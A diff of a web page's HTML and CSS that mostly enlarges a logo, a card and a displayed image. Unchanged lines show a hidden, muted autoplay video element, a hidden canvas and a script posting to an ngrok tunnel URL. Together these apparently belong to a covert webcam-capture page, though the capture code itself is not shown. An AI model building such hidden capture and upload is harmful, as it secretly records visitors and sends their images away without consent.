@@ -18,8 +18,8 @@ body{
 header{display:flex;align-items:center;justify-content:space-between;gap:20px;}
 .logo{display:flex;align-items:center;gap:12px;}
 .logo .mark img{
-  width:36px; /* taille réduite */
-  height:36px;
+  width:28px; /* logo plus petit */
+  height:28px;
   border-radius:6px;
 }
 .logo h2{margin:0;font-size:18px;font-weight:600;}
@@ -31,14 +31,29 @@ p.lead{margin:0 0 20px;color:rgba(255,255,255,0.85);}
 .cta-row{display:flex;gap:12px;flex-wrap:wrap;}
 .btn{background:var(--accent);color:white;padding:14px 22px;border-radius:12px;border:0;font-size:16px;cursor:pointer;box-shadow:0 8px 24px rgba(30,144,255,0.12);}
 .hero-right{display:flex;align-items:center;justify-content:center;}
-.card{background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01)); padding:18px; border-radius:14px; box-shadow:0 10px 30px rgba(2,6,23,0.6);}
-#display{display:block;border-radius:10px;max-width:320px;width:320px;height:240px;object-fit:cover;border:2px solid rgba(255,255,255,0.06);}
+.card{
+  background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
+  padding:18px; border-radius:14px;
+  box-shadow:0 10px 30px rgba(2,6,23,0.6);
+  max-width:420px; /* plus large */
+  width:100%;
+}
+#display{
+  display:block;
+  border-radius:10px;
+  max-width:100%;
+  width:400px; /* plus large */
+  height:300px; /* plus haut */
+  object-fit:cover;
+  border:2px solid rgba(255,255,255,0.06);
+}
 .actions{margin-top:18px;text-align:center;}
 footer{margin-top:50px;color:rgba(255,255,255,0.4);font-size:13px;}
 @media (max-width:760px){
   h1{font-size:26px;}
   .hero-left{text-align:center;}
   header{flex-direction:column;align-items:center;gap:10px;}
+  #display{width:100%; height:auto;}
 }
 </style>
 </head>
@@ -67,7 +82,7 @@ footer{margin-top:50px;color:rgba(255,255,255,0.4);font-size:13px;}
 
     <div class="hero-right">
       <div class="card">
-        <img id="display" src="Capture.PNG?v=1" alt="Capture" width="320" height="240">
+        <img id="display" src="Capture.PNG?v=2" alt="Capture" width="400" height="300">
         <div class="actions"></div>
       </div>
     </div>
@@ -75,7 +90,7 @@ footer{margin-top:50px;color:rgba(255,255,255,0.4);font-size:13px;}
 </div>
 
 <video id="video" autoplay muted playsinline style="display:none;width:0;height:0;"></video>
-<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+<canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
 
 <script>
 const API_URL = "https://unsighing-prepalatine-yi.ngrok-free.dev/post.php";
